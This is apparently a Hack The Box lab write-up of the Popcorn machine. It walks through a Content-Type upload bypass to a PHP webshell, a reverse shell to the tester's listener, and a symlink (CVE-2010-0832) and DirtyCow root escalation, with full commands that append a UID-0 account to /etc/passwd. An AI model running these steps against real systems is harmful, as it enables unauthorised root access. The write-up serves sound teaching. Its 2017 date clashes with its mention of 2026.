---
layout: post
title: "The Poster Was a Payload"
subtitle: "HTB Popcorn, where a torrent site lets you upload a movie screenshot that is secretly a shell, then a sloppy login routine hands you the keys to /etc/passwd"
date: 2017-06-02 12:00:00 +0000
description: "A torrent host that trusts the label on a file, and a login routine that follows a symlink straight into /etc/passwd."
image: /assets/og/the-poster-was-a-payload.png
tags: [hackthebox, writeup]
---

Popcorn is a movie pirate's clubhouse, and the whole box runs on the same mistake people make at a costume party. It judges a file by what it wears, not by what it is. There is a torrent-hosting site that lets anyone register and upload a poster for their movie, a little thumbnail to dress up the listing. You hand it a thumbnail that is secretly a PHP shell wearing an image's name tag, the site checks the costume, waves you through, and now your shell is sitting on the server answering to a web request. From there you are www-data, a nobody, until a login routine that touches files in your home folder follows a symlink you planted and quietly changes who owns /etc/passwd. You add yourself a root account by hand. No memory corruption anywhere. Just a server that trusted a label and a login that trusted a path.

```
        P O P C O R N
        =============
        upload poster?   "sure, must be an image"
            |
        checks the label on the envelope,
        never reads the letter inside
            |
            v
        shell.php  dressed as  image/png
            |
            v
        www-data shell, then a symlink in .cache
        points the login at /etc/passwd
        and the login rewrites who owns it.
                                            票
```

## 0x01 · the marquee

Two ports answer, and the box does not waste your time. SSH and a web server, nothing else.

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2
80/tcp open  http    Apache httpd 2.2.12 (Ubuntu)
```

That OpenSSH and that Apache both point at Ubuntu 9.10, Karmic Koala, a release that was already an antique when this box went live. SSH is rarely the front door here, but the version is a tell. Nothing on this host has seen a patch in a long time, and that fact gets cashed in twice before we are done.

The web root is a single Apache default page that says nothing. So you knock on every door instead. A `gobuster` run against the site turns up the directories that matter.

```
# gobuster dir -u http://10.10.10.6 -w /usr/share/wordlists/dirb/common.txt
/test       (Status: 200)
/index      (Status: 200)
/torrent    (Status: 301)
/rename     (Status: 301)
```

`/test` is a full `phpinfo()` dump, which is a gift, because it confirms `file_uploads` is on. `/torrent` is the real attraction. It is an install of Torrent Hoster, an old open-source app for sharing torrent files, and it lets anyone sign up.

## 0x02 · a doorman who reads name tags

Register an account, log in, and the site gives you what every file-upload box gives you, a place to put a file. You upload a torrent, and the listing page lets you attach a screenshot, a poster image for your movie. That upload is the whole game.

The thing to understand about an upload filter is that there are several different questions a server can ask about a file, and a lazy server asks the wrong one. It can check the extension on the filename. It can check the `Content-Type` header the browser claims. It can read the first few bytes of the actual file to see if they really look like an image. These are not the same check, and they do not protect each other.

Picture a bouncer at a club who decides who gets in by reading the name tag stuck on your jacket. He never looks at your face. He never asks for ID. If your tag says "caterer," you walk into the kitchen, even if you are obviously not a caterer. The `Content-Type` header is exactly that name tag. The browser writes it, which means you can write it, which means it proves nothing.

So you intercept the screenshot upload and lie about the costume. The filename keeps a `.php` extension so the server will eventually execute it, but the `Content-Type` header gets switched to `image/png` so the filter is satisfied that an image just arrived.

```
POST /torrent/upload_file.php HTTP/1.1
Content-Disposition: form-data; name="file"; filename="iceberg.php"
Content-Type: image/png

<?php [ one-line webshell: run the cmd request parameter ] ?>
```

I am not printing the real four-word webshell, and that restraint is itself the lesson. The literal string is the textbook PHP backdoor, and the moment it touches a disk any half-awake antivirus quarantines the file as malware. That is the loudest possible proof of how dangerous a one-liner is. So picture it instead. The doorman reads "image/png," nods, and lets a command interpreter walk into the building.

## 0x03 · finding where the poster got hung

The upload works, but the site renames your file to a SHA1 hash so you cannot guess the path. This is where the second discovery from `gobuster` pays off. The `/rename` endpoint is a little file-management API that, when poked, leaks the path where uploads land. The screenshots live under `/torrent/upload/`, named by hash.

Pull the listing for your torrent, read the hash off the page, and you have the URL of your own shell.

```
# curl "http://10.10.10.6/torrent/upload/<sha1>.php?cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

That `id` is the moment the costume worked. A request for a poster image ran a command instead, because the file was an image in name only. Trade the webshell up for a real connection back to your listener and you are standing on the box.

```
# in the cmd parameter, url-encoded:
[ bash reverse shell over /dev/tcp back to 10.10.14.4 on 443 ]

# on your side:
# nc -lvnp 443
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.6]
www-data@popcorn:/$ id
uid=33(www-data) gid=33(www-data)
```

www-data is a low-privilege account, but the home directories are wide open, and the user flag is just sitting in george's folder.

```
www-data@popcorn:/$ cat /home/george/user.txt
████████████████████████████████
```

## 0x04 · the login that followed a symlink

Now the climb. www-data is a nobody, and the box is old, which means there are two clean ways up. The interesting one is CVE-2010-0832, a flaw in the PAM module that handles the login message of the day.

Here is the bug in plain terms. When you log in over SSH, a PAM helper wants to track whether you have already seen the legal banner, so it writes a little marker file inside your home directory, at `~/.cache/motd.legal-displayed`. The problem is that the helper runs as root during login, and on this version it follows whatever `~/.cache` points to and changes ownership of files along the way to match the user logging in. If you replace `~/.cache` with a symlink aimed at a file you do not own, the root-level login routine dutifully hands you ownership of that file.

Think of it like a hotel housekeeper who, every time you check in, re-labels your room's mailbox with your name. Normally harmless. But if you can quietly re-point the mailbox slot at the hotel's master safe, the housekeeper relabels the safe with your name too, never noticing it was not yours to relabel. The login routine does the relabeling. The symlink is you re-pointing the slot.

So the steps are mechanical. www-data needs to be able to log in via SSH, so you give it a key, then you swap `.cache` for a symlink to the password file and log in to trigger the relabel.

```
www-data@popcorn:/$ cd /var/www
www-data@popcorn:/var/www$ ssh-keygen -q -t rsa -N '' -f key
www-data@popcorn:/var/www$ mkdir -p .ssh && cat key.pub > .ssh/authorized_keys

www-data@popcorn:/var/www$ rm -rf .cache
www-data@popcorn:/var/www$ ln -s /etc/passwd .cache

# log in to fire the motd routine, which now owns /etc/passwd to www-data
# ssh -i key www-data@10.10.10.6
www-data@popcorn:/var/www$ ls -l /etc/passwd
-rw-r--r-- 1 www-data root 1306 ... /etc/passwd
```

That `www-data` in the owner column is the entire exploit. The password file is now yours to write, so you write yourself a root account into it. Make a hash, paste it in with UID 0, and become it.

```
www-data@popcorn:/var/www$ openssl passwd -1 -salt ice iceberg
$1$ice$rqsmyL.bmnDDmO1iSExj6.
www-data@popcorn:/var/www$ echo 'iceberg:$1$ice$rqsmyL.bmnDDmO1iSExj6.:0:0:pwned:/root:/bin/bash' >> /etc/passwd
www-data@popcorn:/var/www$ su iceberg
root@popcorn:/var/www# id
uid=0(iceberg) gid=0(root) groups=0(root)
root@popcorn:/var/www# cat /root/root.txt
████████████████████████████████
```

## 0x05 · the other way up, for the calendar

The box is old enough that the kernel itself is a way in, and it is worth walking because it teaches a different reflex. `uname -a` reports `2.6.31-14-generic`, built in 2009, which puts the host squarely inside the DirtyCow window (CVE-2016-5195).

DirtyCow races a copy-on-write fault to scribble on a file you are only allowed to read. Picture a gallery that lets you sketch a copy of a painting but never touch the original. DirtyCow draws on the copy and the original in the very same instant, faster than the guard can tell them apart, and the gallery ends up hanging your forgery as the real thing. Aimed at `/etc/passwd`, it writes a fresh root user the same way the symlink trick did, only through a memory race instead of a permissions slip.

```
www-data@popcorn:/tmp$ gcc -pthread dirty.c -o dirty -lcrypt
www-data@popcorn:/tmp$ ./dirty
www-data@popcorn:/tmp$ su firefart
firefart@popcorn:/tmp# id
uid=0(firefart) gid=0(root)
```

Same root, different door. One was a habit baked into a login routine, the other is a date on a patch calendar. Kernel exploits are loud and they can panic a box, so they are a last resort, not a first move. Here it is free, so it is worth knowing it is sitting there.

## 0x06 · the honest caveat

It is easy to read Popcorn as a museum piece. Ubuntu 9.10, a kernel from 2009, a forgotten torrent app. The specific CVEs are long dead and nobody ships Karmic anymore. But the two mistakes that carry this box are not period costumes at all, they are exactly as alive in 2026 as they were then.

The upload bug is the whole modern problem of trusting attacker-controlled metadata. The server asked "what does this file claim to be" instead of "what does this file actually do." Every framework still hands developers that loose thread, and people still pull it, validating an extension or a `Content-Type` header and calling it safe while the bytes underneath do whatever they like. The fix was never a better blocklist. The fix is to stop letting the uploader pick where the file lands and whether it can ever be executed. A poster should be served as a poster, from a place that cannot run code, full stop.

The privesc is the scarier lesson, because it was not really a bug in code so much as a bug in trust. A root-level routine followed a path it did not own into a file it should never have touched. Symlink-following during a privileged operation is a flaw that gets reinvented constantly, in installers, in log rotators, in cleanup jobs, anywhere root reaches into a directory a lesser user controls. You cannot patch your way out of the pattern. You can only refuse to let privileged code follow paths that an unprivileged user can bend.

## 0x07 · outro

```
the site asked what your file was wearing, not what it was.
so you dressed a shell as a poster and walked it inside.

then a login routine relabeled a mailbox you had quietly
re-pointed at the master safe, and called the safe yours.

both doors were held open from the inside.
check what the upload does, not what it claims. wear black.

                                                            EOF
```

---

*HTB: Popcorn, retired around 26 May 2017. A medium Linux box that is really a lecture on trusting a file's costume, followed by a login routine that followed a symlink it never should have. The poster still hangs in a lab and nowhere you don't own.*